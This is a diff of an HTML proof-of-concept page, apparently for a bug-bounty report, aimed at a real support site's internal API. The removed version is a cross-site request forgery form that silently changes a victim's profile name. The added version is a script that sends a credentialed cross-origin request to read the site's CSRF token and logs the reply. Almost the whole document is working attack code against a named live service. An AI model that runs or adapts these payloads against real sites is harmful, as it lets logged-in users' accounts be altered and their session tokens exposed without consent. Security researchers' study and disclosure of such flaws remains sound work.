@@ -1,8 +1,24 @@
 <html>
 	<body>
-		<form method="POST" action="https://support.wurl.com/hc/api/internal/en-us/aggregated_user_profile.json">
-			<input type="hidden" name="profile[name]" value="Infinix%20Htc%20zn"/>
-			<input type="submit" value="Submit">
-		</form>
+		<script>
+			var xhr = new XMLHttpRequest();
+			xhr.open("GET", "https://support.wurl.com/hc/api/internal/csrf_token.json", true);
+			xhr.withCredentials = true;
+
+			xhr.onload = function() {
+			  if (xhr.status >= 200 && xhr.status < 300) {
+			    console.log("Response:", xhr.responseText);
+			  } else {
+			    console.error("Request failed with status:", xhr.status);
+			  }
+			};
+
+			xhr.onerror = function() {
+			  console.error("An error occurred during the request.");
+			};
+			
+			xhr.send();
+
+		</script>
 	</body>
 <html>
